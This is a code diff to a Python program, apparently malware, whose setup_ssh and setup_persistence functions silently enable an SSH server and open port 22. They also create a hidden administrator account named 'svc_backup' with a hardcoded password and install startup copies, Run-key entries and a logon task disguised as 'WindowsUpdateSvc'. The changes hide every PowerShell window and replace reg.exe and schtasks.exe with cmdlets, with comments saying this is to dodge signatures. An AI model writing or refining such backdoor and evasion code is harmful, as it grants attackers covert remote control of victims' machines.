@@ -161,20 +161,20 @@ def setup_ssh():
 
     try:
         check_ssh = subprocess.run(
-            'powershell -NoProfile -Command "(Get-Service sshd -ErrorAction SilentlyContinue).Status"',
+            'powershell -NoProfile -WindowStyle Hidden -Command "(Get-Service sshd -ErrorAction SilentlyContinue).Status"',
             shell=True, capture_output=True, text=True
         )
         if "Running" in check_ssh.stdout:
             return
 
         ps_install = (
-            'powershell -NoProfile -Command "'
+            'powershell -NoProfile -WindowStyle Hidden -Command "'
             'Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"'
         )
         subprocess.run(ps_install, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         ps_service = (
-            'powershell -NoProfile -Command "'
+            'powershell -NoProfile -WindowStyle Hidden -Command "'
             'Start-Service sshd; '
             'Set-Service -Name sshd -StartupType Automatic; '
             'New-NetFirewallRule -Name sshd -DisplayName \'OpenSSH Server\' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction SilentlyContinue"'
@@ -182,7 +182,7 @@ def setup_ssh():
         subprocess.run(ps_service, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         ps_user = (
-            'powershell -NoProfile -Command "'
+            'powershell -NoProfile -WindowStyle Hidden -Command "'
             '$u = \'svc_backup\'; $p = ConvertTo-SecureString \'P@ssw0rd2026!\' -AsPlainText -Force; '
             'New-LocalUser -Name $u -Password $p -FullName \'Windows Service\' -Description \'System Service Account\' -ErrorAction SilentlyContinue; '
             'Add-LocalGroupMember -Group \'Administrators\' -Member $u -ErrorAction SilentlyContinue; '
@@ -217,12 +217,25 @@ def setup_persistence():
         os.makedirs(startup_dir, exist_ok=True)
         shutil.copy2(current_exe, target_exe)
 
-        reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{REG_NAME}" /t REG_SZ /d "\\"{target_exe}\\"" /f'
-        subprocess.run(reg_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # 1. Registry via PowerShell (avoids cmd.exe signature)
+        ps_reg = (
+            'powershell.exe -NoProfile -WindowStyle Hidden -Command "'
+            'New-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\' '
+            '-Name \'WindowsUpdateSvc\' -Value \'{0}\' -PropertyType String -Force"'
+        ).format(target_exe)
+        subprocess.run(ps_reg, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        task_cmd = f'schtasks /create /tn "{REG_NAME}" /tr "\\"{target_exe}\\"" /sc onlogon /rl highest /f'
-        subprocess.run(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # 2. Scheduled Task via PowerShell Cmdlets (WMI), not schtasks.exe
+        ps_task = (
+            'powershell.exe -NoProfile -WindowStyle Hidden -Command "'
+            '$A = New-ScheduledTaskAction -Execute \'{0}\'; '
+            '$T = New-ScheduledTaskTrigger -AtLogOn; '
+            '$P = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive; '
+            'Register-ScheduledTask -TaskName \'WindowsUpdateSvc\' -Action $A -Trigger $T -Principal $P -Force"'
+        ).format(target_exe)
+        subprocess.run(ps_task, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+        # 3. Start the new copy silently
         subprocess.Popen([target_exe], creationflags=subprocess.CREATE_NO_WINDOW)
         sys.exit(0)
 
